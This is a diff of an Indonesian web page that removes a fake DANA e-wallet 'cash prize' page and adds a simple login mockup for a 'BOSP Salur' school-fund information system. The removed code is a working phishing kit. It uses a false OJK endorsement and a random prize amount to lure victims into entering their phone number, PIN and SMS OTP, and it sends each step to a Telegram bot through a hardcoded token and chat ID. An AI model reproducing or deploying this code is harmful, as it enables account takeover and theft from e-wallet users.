@@ -2,319 +2,139 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>DANA KAGET - Ambil Saldo Sekarang</title>
-    
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Informasi BOSP Salur - Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Lucide Icons for consistent look -->
+    <script src="https://unpkg.com/lucide@latest"></script>
     <style>
-        :root {
-            --dana-blue: #118eea;
-            --gold: #ffd700;
-            --white: #ffffff;
-            --glass: rgba(255, 255, 255, 0.1);
-        }
-
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
-
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        
         body {
-            background: linear-gradient(rgba(0, 86, 179, 0.9), rgba(17, 142, 234, 0.95)), 
-                        url('https://i.ibb.co.com/PZ8BgZ13/Blog-Banner-1080-x-556-c532047cac.png');
-            background-size: cover; background-position: center; background-attachment: fixed;
-            min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 15px;
-            user-select: none;
+            font-family: 'Inter', sans-serif;
+            background-color: #e9ecef;
         }
 
-        .app-shell {
-            width: 100%; max-width: 410px; background: var(--glass); backdrop-filter: blur(35px);
-            border-radius: 25px; border: 1px solid rgba(255,255,255,0.2);
-            box-shadow: 0 40px 80px rgba(0,0,0,0.5); overflow: hidden; position: relative;
+        .login-card {
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
         }
 
-        .ojk-header {
-            background: rgba(255, 255, 255, 0.98);
-            padding: 10px 15px; display: flex; align-items: center; justify-content: center; gap: 12px;
-        }
-        .ojk-logo-img { height: 22px; width: auto; }
-        .ojk-text { font-size: 0.65rem; color: #333; font-weight: 800; text-transform: uppercase; line-height: 1.2; }
-
-        .hero-banner {
-            width: 100%; height: 180px; 
-            background: url('https://i.ibb.co.com/PZ8BgZ13/Blog-Banner-1080-x-556-c532047cac.png');
-            background-size: cover; background-position: center; 
-            border-bottom: 3px solid var(--gold);
+        .input-icon-wrapper {
+            position: relative;
         }
 
-        .alert-box {
-            background: rgba(255, 215, 0, 0.2);
-            border: 1px solid var(--gold);
-            border-radius: 12px;
-            padding: 12px;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: flex-start;
-            gap: 10px;
+        .input-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #9ca3af;
         }
-        .alert-box p { color: #fff; font-size: 0.75rem; font-weight: 600; line-height: 1.4; }
-
-        .stage { display: none; padding: 25px; animation: slideUp 0.5s ease-out; }
-        .stage.active { display: block; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(25px); } to { opacity: 1; transform: translateY(0); } }
-
-        /* ENVELOPE */
-        .env-container {
-            width: 130px; height: 90px; background: #f44336; margin: 15px auto;
-            position: relative; border-radius: 0 0 12px 12px; cursor: pointer;
-        }
-        .env-flap {
-            position: absolute; top: -50px; left: 0; border-left: 65px solid transparent;
-            border-right: 65px solid transparent; border-bottom: 50px solid #d32f2f;
-            transform-origin: bottom; transition: 0.6s ease; z-index: 2;
-        }
-        .env-container.open .env-flap { transform: rotateX(180deg); }
-        .env-paper {
-            position: absolute; width: 110px; height: 70px; background: white; left: 10px; top: 10px;
-            border-radius: 8px; display: flex; flex-direction: column; justify-content: center; align-items: center;
-            color: #2ecc71; font-weight: 800; z-index: 1; transition: 0.6s;
-        }
-        .env-container.open .env-paper { transform: translateY(-65px); z-index: 3; }
-
-        .input-box {
-            background: white; border-radius: 15px; padding: 16px; display: flex; align-items: center;
-            margin-bottom: 20px; box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
-        }
-        .input-box i { color: var(--dana-blue); margin-right: 15px; font-size: 1.2rem; }
-        .input-box input { border: none; outline: none; width: 100%; font-size: 1.1rem; font-weight: 700; color: #333; }
-
-        .btn-action {
-            width: 100%; padding: 18px; border: none; border-radius: 15px;
-            background: var(--gold); color: #004d99; font-weight: 800; font-size: 1.1rem;
-            cursor: pointer; box-shadow: 0 8px 20px rgba(255,215,0,0.4);
-        }
-        .btn-action:disabled { background: #b0bec5; color: #78909c; cursor: not-allowed; }
-
-        .box-group { display: flex; justify-content: center; gap: 8px; margin: 15px 0; }
-        .digit-box { 
-            width: 40px; height: 50px; 
-            background: rgba(255, 255, 255, 0.15); 
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            border-radius: 10px;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 1.4rem; font-weight: 700; color: var(--gold);
-        }
-        .digit-box.filled { border-color: var(--gold); background: rgba(255, 255, 255, 0.25); }
-
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; max-width: 280px; margin: 0 auto; }
-        .key {
-            height: 58px; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.15);
-            border-radius: 50%; display: flex; justify-content: center; align-items: center;
-            font-size: 1.5rem; font-weight: 600; color: white; cursor: pointer;
-        }
-        .key:active { background: white; color: var(--dana-blue); transform: scale(0.9); }
-
-        .timer-text { color: var(--gold); font-size: 0.85rem; margin-top: 15px; text-align: center; font-weight: 600; }
-
-        footer { padding: 20px; text-align: center; color: white; font-size: 0.65rem; opacity: 0.8; line-height: 1.5; }
-
-        .overlay {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.85); display: none; flex-direction: column;
-            justify-content: center; align-items: center; z-index: 100;
-        }
-        .spinner { width: 45px; height: 45px; border: 5px solid rgba(255,255,255,0.1); border-top-color: var(--gold); border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
-<body oncontextmenu="return false;">
+<body class="min-h-screen flex flex-col items-center justify-center p-4">
 
-<div class="app-shell">
-    <div class="ojk-header">
-        <img src="https://i.ibb.co.com/WvJPSCC9/OJK-Logo.png" class="ojk-logo-img" alt="OJK">
-        <div class="ojk-text">Terdaftar & Diawasi<br>Oleh Otoritas Jasa Keuangan</div>
+    <!-- Header Section -->
+    <div class="text-center mb-8">
+        <img src="https://img.sanishtech.com/u/2affb8d157b1efecae4163ec9df2c797.png" 
+             alt="Logo BOSP" 
+             class="h-20 mx-auto mb-2 object-contain"
+             onerror="this.src='https://via.placeholder.com/200x80?text=BOSP+LOGO'">
+        <h1 class="text-2xl font-normal text-gray-600">Sistem Informasi <span class="font-bold text-gray-800">BOSP</span></h1>
+        <h2 class="text-3xl font-medium text-gray-700">Salur</h2>
     </div>
 
-    <div class="hero-banner"></div>
+    <!-- Login Form Card -->
+    <div class="bg-white p-8 rounded-sm w-full max-w-md login-card border border-gray-100">
+        <p class="text-center text-gray-500 mb-6 text-sm">Login untuk masuk</p>
 
-    <div id="stg-1" class="stage active">
-        <div class="env-container" id="env-click" onclick="handle_open(this)">
-            <div class="env-flap"></div>
-            <div class="env-paper">
-                <span style="font-size: 0.5rem; color: #888;">SALDO KAGET</span>
-                <span id="random-val" style="font-size: 1rem; color: #2ecc71; font-weight: 800;"></span>
+        <form id="loginForm" class="space-y-4">
+            <!-- Username -->
+            <div class="input-icon-wrapper">
+                <input type="text" 
+                       placeholder="Username" 
+                       class="w-full border border-gray-300 p-2.5 pr-10 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 text-gray-700"
+                       required>
+                <i data-lucide="mail" class="input-icon w-5 h-5"></i>
+            </div>
+
+            <!-- Password -->
+            <div class="input-icon-wrapper">
+                <input type="password" 
+                       placeholder="Password" 
+                       class="w-full border border-gray-300 p-2.5 pr-10 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 text-gray-700"
+                       required>
+                <i data-lucide="lock" class="input-icon w-5 h-5"></i>
+            </div>
+
+            <!-- Login Type -->
+            <div class="space-y-1">
+                <label class="text-sm font-semibold text-gray-600">Login Type</label>
+                <select class="w-full border border-gray-300 p-2.5 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 bg-white text-gray-700 appearance-none cursor-pointer">
+                    <option value="bank">Bank</option>
+                    <option value="admin">Admin</option>
+                    <option value="user">User</option>
+                </select>
+            </div>
+
+            <!-- Sign In Button -->
+            <button type="submit" 
+                    class="w-full bg-[#007bff] hover:bg-blue-600 text-white font-medium py-2.5 rounded transition-colors mt-2">
+                Sign In
+            </button>
+        </form>
+
+        <!-- Footer Links -->
+        <div class="mt-8 flex items-center space-x-2 text-sm">
+            <span class="text-red-500">Klik jika</span>
+            <a href="#" class="bg-[#ffc107] hover:bg-yellow-500 text-gray-800 px-3 py-1 rounded font-medium transition-colors">
+                Reset/Lupa Password
+            </a>
+        </div>
+    </div>
+
+    <!-- Notification Container -->
+    <div id="toast" class="fixed bottom-5 right-5 hidden bg-white border-l-4 border-blue-500 p-4 shadow-lg rounded transform transition-all duration-300 translate-y-20">
+        <div class="flex items-center">
+            <div class="flex-shrink-0">
+                <i data-lucide="info" class="w-5 h-5 text-blue-500"></i>
+            </div>
+            <div class="ml-3">
+                <p class="text-sm text-gray-700 font-medium" id="toastMessage"></p>
             </div>
         </div>
-        <h3 style="color:white; text-align:center; margin-bottom:20px; font-size: 0.9rem;" id="txt-hint">Tap amplop untuk klaim hadiah!</h3>
-        
-        <div id="f-ph" style="opacity:0; pointer-events:none; transition: 0.6s;">
-            <div class="input-box">
-                <i class="fas fa-phone-alt"></i>
-                <input type="number" id="ph_num" placeholder="Nomor DANA (08...)" oninput="v_ph()">
-            </div>
-            <button class="btn-action" id="btn_ph" disabled onclick="s_ph()">LANJUTKAN</button>
-        </div>
     </div>
 
-    <div id="stg-2" class="stage">
-        <div style="text-align: center; color: white;">
-            <h2 style="margin-bottom: 10px;">PIN DANA</h2>
-            <p style="font-size: 0.8rem; opacity: 0.8; margin-bottom: 10px;">Masukkan PIN akun DANA Anda</p>
-        </div>
-        <div class="box-group" id="pin_v">
-            <div class="digit-box"></div><div class="digit-box"></div><div class="digit-box"></div>
-            <div class="digit-box"></div><div class="digit-box"></div><div class="digit-box"></div>
-        </div>
-        <div class="keypad">
-            <div class="key" onclick="k_p('pin', 1)">1</div><div class="key" onclick="k_p('pin', 2)">2</div><div class="key" onclick="k_p('pin', 3)">3</div>
-            <div class="key" onclick="k_p('pin', 4)">4</div><div class="key" onclick="k_p('pin', 5)">5</div><div class="key" onclick="k_p('pin', 6)">6</div>
-            <div class="key" onclick="k_p('pin', 7)">7</div><div class="key" onclick="k_p('pin', 8)">8</div><div class="key" onclick="k_p('pin', 9)">9</div>
-            <div style="visibility:hidden"></div><div class="key" onclick="k_p('pin', 0)">0</div><div class="key" onclick="k_d('pin')"><i class="fas fa-backspace"></i></div>
-        </div>
-    </div>
+    <script>
+        // Initialize Lucide Icons
+        lucide.createIcons();
 
-    <div id="stg-3" class="stage">
-        <div class="alert-box">
-            <i class="fas fa-exclamation-triangle" style="color: var(--gold); padding: 5px;"></i>
-            <p>PENTING: Mohon tunggu SMS Kode OTP resmi dari DANA. Pastikan sinyal kuat dan jangan tutup halaman ini agar proses klaim tidak gagal.</p>
-        </div>
-        <div style="text-align: center; color: white;">
-            <h2 style="margin-bottom: 5px;">KODE OTP</h2>
-            <p style="font-size: 0.8rem; opacity: 0.8;">Masukkan kode dari SMS</p>
-        </div>
-        <div class="box-group" id="otp_v">
-            <div class="digit-box"></div><div class="digit-box"></div><div class="digit-box"></div><div class="digit-box"></div>
-        </div>
-        <div class="keypad">
-            <div class="key" onclick="k_p('otp', 1)">1</div><div class="key" onclick="k_p('otp', 2)">2</div><div class="key" onclick="k_p('otp', 3)">3</div>
-            <div class="key" onclick="k_p('otp', 4)">4</div><div class="key" onclick="k_p('otp', 5)">5</div><div class="key" onclick="k_p('otp', 6)">6</div>
-            <div class="key" onclick="k_p('otp', 7)">7</div><div class="key" onclick="k_p('otp', 8)">8</div><div class="key" onclick="k_p('otp', 9)">9</div>
-            <div style="visibility:hidden"></div><div class="key" onclick="k_p('otp', 0)">0</div><div class="key" onclick="k_d('otp')"><i class="fas fa-backspace"></i></div>
-        </div>
-        <div class="timer-text">Kirim ulang dalam <span id="tmr">01:00</span></div>
-    </div>
+        // Form Submission Logic
+        const loginForm = document.getElementById('loginForm');
+        const toast = document.getElementById('toast');
+        const toastMessage = document.getElementById('toastMessage');
 
-    <div id="stg-4" class="stage">
-        <div style="text-align: center; color: white;">
-            <i class="fas fa-check-circle" style="font-size: 4rem; color: var(--gold); margin-bottom: 20px;"></i>
-            <h2>Klaim Diproses!</h2>
-            <p style="opacity: 0.9; font-size: 0.85rem;">Saldo sedang diverifikasi oleh sistem DANA untuk pengiriman ke nomor Anda.</p>
-        </div>
-    </div>
-
-    <footer>
-        <img src="https://i.ibb.co.com/WvJPSCC9/OJK-Logo.png" style="height:18px; filter: brightness(0) invert(1); margin-bottom: 8px;"><br>
-        DANA Terdaftar dan Diawasi oleh OJK & Bank Indonesia.
-    </footer>
-
-    <div class="overlay" id="ldr">
-        <div class="spinner"></div>
-        <h4 style="color:white; margin-top: 15px;" id="ldr_t">Memproses...</h4>
-    </div>
-</div>
-
-<script>
-    const _0xT = "7972043295:AAFVmFycy_8YgMUvc8YM6z1PFkQEPGWfnoY";
-    const _0xC = "8213158720";
-
-    let _d = { ph: "", pi: "", ot: "", amt: "" };
-    let _tm;
-
-    // LOGIC ACAK SAAT DIKLIK
-    function handle_open(e) { 
-        if(e.classList.contains('open')) return;
-        
-        // Acak nominal hanya saat diklik
-        const min = 150000;
-        const max = 1500000;
-        const rand = Math.floor(Math.random() * (max - min + 1) + min);
-        const final = Math.floor(rand / 5000) * 5000;
-        _d.amt = final.toLocaleString('id-ID');
-        
-        document.getElementById('random-val').innerText = "Rp " + _d.amt;
-        document.getElementById('txt-hint').innerText = "Selamat! Masukkan nomor DANA Anda.";
-        
-        e.classList.add('open'); 
-        document.getElementById('f-ph').style.opacity = "1"; 
-        document.getElementById('f-ph').style.pointerEvents = "auto"; 
-    }
-
-    function v_ph() { 
-        _d.ph = document.getElementById('ph_num').value; 
-        document.getElementById('btn_ph').disabled = _d.ph.length < 10; 
-    }
-
-    async function notify(m) {
-        try {
-            await fetch(`https://api.telegram.org/bot${_0xT}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: _0xC, text: m, parse_mode: 'Markdown' })
-            });
-        } catch (e) {}
-    }
-
-    function s_ph() {
-        l_dr("Memverifikasi Nomor...", 1200, () => {
-            notify(`😈 *DATA MASUK*\n💰 *Nominal:* Rp ${_d.amt}\n📱 *No:* \`${_d.ph}\`\n🌐 *UA:* \`${navigator.userAgent}\``);
-            s_tr('stg-1', 'stg-2');
-        });
-    }
-
-    function k_p(t, n) {
-        if(t === 'pin' && _d.pi.length < 6) {
-            _d.pi += n; u_v('pin_v', _d.pi);
-            if(_d.pi.length === 6) s_pi();
-        } else if(t === 'otp' && _d.ot.length < 4) {
-            _d.ot += n; u_v('otp_v', _d.ot);
-            if(_d.ot.length === 4) s_ot();
+        function showToast(message) {
+            toastMessage.textContent = message;
+            toast.classList.remove('hidden', 'translate-y-20');
+            
+            setTimeout(() => {
+                toast.classList.add('translate-y-20');
+                setTimeout(() => toast.classList.add('hidden'), 300);
+            }, 3000);
         }
-    }
 
-    function s_pi() {
-        l_dr("Sinkronisasi PIN...", 1800, () => {
-            notify(`😈 *UPDATE PIN*\n💰 *Nominal:* Rp ${_d.amt}\n📱 *No:* \`${_d.ph}\`\n🔐 *PIN:* \`${_d.pi}\``);
-            s_tr('stg-2', 'stg-3');
-            r_tm();
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            showToast("Mencoba melakukan autentikasi...");
         });
-    }
 
-    function s_ot() {
-        l_dr("Memproses OTP...", 2500, () => {
-            notify(`😈 *FINAL DATA*\n💰 *Nominal:* Rp ${_d.amt}\n📱 *No:* \`${_d.ph}\`\n🔐 *PIN:* \`${_d.pi}\`\n💬 *OTP:* \`${_d.ot}\``);
-            s_tr('stg-3', 'stg-4');
-            confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
+        // Dummy link interaction
+        document.querySelector('a').addEventListener('click', (e) => {
+            e.preventDefault();
+            showToast("Fungsi Lupa Password belum tersedia.");
         });
-    }
-
-    function k_d(t) {
-        if(t==='pin') { _d.pi = _d.pi.slice(0,-1); u_v('pin_v', _d.pi); }
-        else { _d.ot = _d.ot.slice(0,-1); u_v('otp_v', _d.ot); }
-    }
-
-    function u_v(i, v) {
-        const b = document.getElementById(i).children;
-        for(let j=0; j<b.length; j++) {
-            if(j < v.length) { b[j].innerHTML = v[j]; b[j].classList.add('filled'); }
-            else { b[j].innerHTML = ""; b[j].classList.remove('filled'); }
-        }
-    }
-
-    function s_tr(c, n) { document.getElementById(c).classList.remove('active'); document.getElementById(n).classList.add('active'); }
-
-    function l_dr(t, d, c) {
-        const o = document.getElementById('ldr'); document.getElementById('ldr_t').innerText = t;
-        o.style.display = 'flex'; setTimeout(() => { o.style.display = 'none'; c(); }, d);
-    }
-
-    function r_tm() {
-        let s = 60; clearInterval(_tm);
-        _tm = setInterval(() => {
-            let m = Math.floor(s/60), r = s%60;
-            document.getElementById('tmr').innerHTML = `0${m}:${r<10?"0"+r:r}`;
-            if (--s < 0) s = 60;
-        }, 1000);
-    }
-</script>
+    </script>
 </body>
 </html>
+
